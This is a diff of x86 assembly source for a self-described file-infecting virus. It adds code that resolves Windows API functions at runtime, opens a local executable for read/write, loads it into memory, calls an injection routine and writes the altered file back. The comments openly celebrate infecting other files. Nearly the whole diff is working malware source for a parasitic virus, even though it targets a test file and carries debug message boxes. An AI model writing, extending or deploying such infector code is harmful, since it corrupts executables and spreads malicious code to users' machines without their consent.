@@ -22,7 +22,10 @@ begin_copy:
     getProcAddress_name     db "GetProcAddress", 0
     loadLibrary_name        db "LoadLibraryA", 0
 	
-	file_name				db "notepad.exe", 0
+	file_name				db ".\test.exe", 0
+
+	dbg_sysfail				db "A system function failed", 0	; DEBUG
+	dbg_infectfail			db "Problem with an exe file", 0	; DEBUG
 
 ; Function names
 	closehandle_name		db "CloseHandle", 0	;
@@ -30,7 +33,9 @@ begin_copy:
 	getfilesize_name		db "GetFileSize", 0	;
     messagebox_name         db "MessageBoxA", 0
 	readfile_name			db "ReadFile", 0 ;
+	setfilepointer_name		db "SetFilePointer", 0
     virtualalloc_name       db "VirtualAlloc", 0
+	writefile_name			db "WriteFile", 0
 
 ; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
 ; DATA (inside .code section) - END
@@ -41,7 +46,8 @@ begin_copy:
 ; PROCEDURES
 ; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
 
-	include		utils.asm
+include		utils.asm
+include		infect_file.asm
 
 ; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
 
@@ -58,7 +64,7 @@ virus_start:                            ; *** ENTRY *** ENTRY *** ENTRY *** ENTR
     call    delta_offset				; Get delta offset for position independence.
 delta_offset:
     pop     ebx
-    sub     ebx, delta_offset           ; now ebx == delta offset. Add it to any address which is inside this program to be position independant.
+    sub     ebx, delta_offset           ; now ebx == delta offset. Add it to any address which is inside this program to be position independent.
 
 main PROC NEAR
 
@@ -75,7 +81,9 @@ main PROC NEAR
 	LOCAL	getfilesize_addr:DWORD
 	LOCAL	messagebox_addr:DWORD
 	LOCAL	readfile_addr:DWORD
+	LOCAL	setfilepointer_addr:DWORD
 	LOCAL	virtualalloc_addr:DWORD
+	LOCAL	writefile_addr:DWORD
 
     and     esi, 0FFFF0000h             ; mask address inside k32.dll to get page aligned like sections.
 
@@ -86,15 +94,13 @@ search_k32:
 
     mov     imageBase, esi              ; imageBase = Real BaseAdress (for sure).
 
-    add     esi, [esi + 3Ch]            ; Offset of the PE header. Now esi -> PE header
+    add     esi, [esi + 3Ch]            ; esi -> IMAGE_NT_HEADERS
     cmp     word ptr [esi], "EP"
     jne     exit
 
-; --------------------------------------> esi now contains the addres of kernel32.dll's IMAGE_NT_HEADERS.
-
     add     esi, 18h                    ; esi -> IMAGE_OPTIONAL_HEADER
 
-    cmp     word ptr [esi], 10bh        ; IMAGE_OPTIONAL_HEADER magic number for 32bits programs
+    cmp     word ptr [esi], 10bh        ; 10bh = IMAGE_OPTIONAL_HEADER magic number for 32bits programs
     jne     exit
 
     add     esi, 60h                    ; esi -> DataDirectory[0] (=> export_table)
@@ -185,15 +191,18 @@ ENDM
 	LOADFUNC	getfilesize_name,	kernel32_dll_name,	getfilesize_addr
 	LOADFUNC	messagebox_name,	user32_dll_name,	messagebox_addr
 	LOADFUNC	readfile_name,		kernel32_dll_name,	readfile_addr
+	LOADFUNC	setfilepointer_name,kernel32_dll_name,	setfilepointer_addr
 	LOADFUNC	virtualalloc_name,	kernel32_dll_name,	virtualalloc_addr
+	LOADFUNC	writefile_name,		kernel32_dll_name,	writefile_addr
 
 ; functions loading end.
-	
-    push    0                           ;
-    push    offset msgOfVictory			;
-    push    offset msgOfVictory         ;
-    push    0                           ;
-    call    messagebox_addr             ; Messagebox of VICTORY !!!
+
+    push    0                           	;
+	lea		ecx, [ebx + offset msgOfVictory];
+    push    ecx								;
+    push    ecx         					;
+    push    0                           	;
+    call    messagebox_addr             	; Msgbox of VICTORY !!!
 
 ; --------------------------------------> Now, time to infect the other files ! Niark niark niark...
 
@@ -202,38 +211,85 @@ ENDM
 	push 	3							; ONLY_EXISTING (only if it exists)
 	push	0							; no security
 	push	0							; no sharing
-	push	60000000h					; GENERIC_READ | GENERIC_WRITE
-	push	offset file_name
-	call	createfile_addr				; open a file
+	push	0c0000000h					; GENERIC_READ | GENERIC_WRITE
+	lea		ecx, [ebx + offset file_name]
+	push	ecx							;
+	call	createfile_addr				; CreateFile()
 	mov		filehandle, eax
-
-	cmp		filehandle, -1				; Check errors.
-	je		exit
+	cmp		filehandle, -1
+	je		syserr
 	
 	push	0
 	push	filehandle
-	call	getfilesize_addr
-	
-	cmp		eax, -1						; Check errors.
-	je		exit
+	call	getfilesize_addr			; GetFileFize()
+	mov		filesize, eax
+	cmp		eax, -1
+	je		syserr
 
 	add		eax, 5000h					; TODO: calculate size to allocate more properly.
-	
-	push    04h
-	push    00001000h
+
+	push    04h							; read/write permissions
+	push    00001000h					; MEM_COMMIT
 	push    eax							; size to allocate
-	push    0
-	call    virtualalloc_addr
-	mov     fileptr, eax                 ; allocate some mem with read/write permissions
-
+	push    0							; address. NULL == we want a new address
+	call    virtualalloc_addr			; VirtualAlloc()
+	mov     fileptr, eax
 	cmp		eax, 0
-	je		exit
+	je		syserr
 
-	push	
+	push	0
+	lea		ecx, [esp - 4]
+	push	ecx
+	push	filesize
 	push	fileptr
 	push	filehandle
-	call	readfile_addr
+	call	readfile_addr				; ReadFile(). Read all the file and put it in our buffer.
+	cmp		eax, 0
+	je		syserr
+
+; --------------------------------------> OK guys, now we have our file mapped in memory. Let's inject some code !
+
+	invoke	infect_file, fileptr		; Procedure to properly inject our code into the file of interest.
+
+	cmp		eax, 0								; DEBUG: if eax == 0 sth went wrong, print debug
+	jne		infect_dbg							; DEBUG
+	push	0									; DEBUG
+	lea		ecx, [ebx + offset dbg_infectfail]	; DEBUG
+	push	ecx									; DEBUG
+	push	ecx									; DEBUG
+	push	0									; DEBUG
+	call	messagebox_addr						; DEBUG
+infect_dbg:										; DEBUG
+
+	push	0							; 0 = from beginning of the file
+	push	0							; 0 = no high order DWORD for size to move
+	push	0							; size to move
+	push	filehandle
+	call	setfilepointer_addr			; Move back to the beginning of the file
+	cmp		eax, -1
+	je		syserr
 	
+	push	0
+	lea		ecx, [esp - 4]
+	push	ecx
+	mov		ecx, filesize
+	add		ecx, 5000h
+	push	ecx
+	push	fileptr
+	push	filehandle
+	call	writefile_addr				; Write the buffer back to the file.
+
+	push	filehandle
+	call	closehandle_addr			; We close the file because we are not pigs.
+
+	jmp		exit
+syserr:
+	push	0
+	lea		ecx, [ebx + offset dbg_sysfail]
+	push	ecx
+	push	ecx
+	push	0
+	call	messagebox_addr
 exit:
     ret
 
